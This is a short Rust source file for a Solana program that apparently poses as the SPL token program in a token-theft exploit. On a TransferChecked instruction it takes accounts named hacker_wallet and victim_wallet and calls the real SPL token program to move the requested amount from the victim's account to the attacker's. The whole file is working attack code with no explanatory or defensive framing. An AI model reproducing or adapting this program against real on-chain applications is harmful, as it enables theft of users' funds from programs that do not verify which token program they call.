use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program::invoke,
    pubkey::Pubkey,
};

use spl_token::instruction::TokenInstruction;

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    match TokenInstruction::unpack(instruction_data)? {
        TokenInstruction::TransferChecked { amount, .. } => {
            let account_info_iter = &mut accounts.iter();
            let hacker_wallet = next_account_info(account_info_iter)?;
            let real_spl_as_mint = next_account_info(account_info_iter)?;
            let victim_wallet = next_account_info(account_info_iter)?;
            let authority = next_account_info(account_info_iter)?;

            invoke(
                &spl_token::instruction::transfer(
                    real_spl_as_mint.key,
                    victim_wallet.key,
                    hacker_wallet.key,
                    authority.key,
                    &[],
                    amount,
                )
                .unwrap(),
                &[
                    real_spl_as_mint.clone(),
                    victim_wallet.clone(),
                    hacker_wallet.clone(),
                    authority.clone(),
                ],
            )?;

            Ok(())
        }
        _ => unimplemented!(),
    }
}
